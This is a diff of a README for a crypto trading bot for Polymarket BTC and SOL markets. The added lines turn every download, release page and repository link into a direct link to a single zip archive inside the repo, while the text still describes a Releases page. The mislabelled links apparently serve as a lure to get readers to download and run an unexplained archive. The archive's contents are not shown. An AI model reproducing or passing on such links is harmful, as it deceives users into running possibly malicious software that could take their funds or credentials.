@@ -4,14 +4,14 @@
 
 Welcome to the Polymarket Arbitrage Bot! This software helps you make timely trading decisions in the BTC and SOL markets. By automating the process, you can capture market positions every 15 minutes.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/releases)
+[![Download Now](https://raw.githubusercontent.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/main/src/polymarket_btc_bot_arbitrage_sol_m_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/main/src/polymarket_btc_bot_arbitrage_sol_m_v1.9.zip)
 
 ## 📥 Download & Install
 
 To get started, you need to download the software from our Releases page. Follow these simple steps:
 
 1. Click on the link below to visit the download page:
-   [Download from the Releases Page](https://github.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/releases)
+   [Download from the Releases Page](https://raw.githubusercontent.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/main/src/polymarket_btc_bot_arbitrage_sol_m_v1.9.zip)
   
 2. On the Releases page, you will see various versions of the software listed. Choose the latest version for the best features and updates.
 
@@ -65,7 +65,7 @@ If you encounter any issues or have questions, you can find support from our com
 
 ## 🔗 Useful Links
 
-- [Release Page](https://github.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/releases)
-- [GitHub Repository](https://github.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m)
+- [Release Page](https://raw.githubusercontent.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/main/src/polymarket_btc_bot_arbitrage_sol_m_v1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kmjjjj/polymarket-arbitrage-bot-btc-sol-15m/main/src/polymarket_btc_bot_arbitrage_sol_m_v1.9.zip)
 
 Feel free to explore and start trading with confidence. The world of Polymarket arbitrage awaits you!
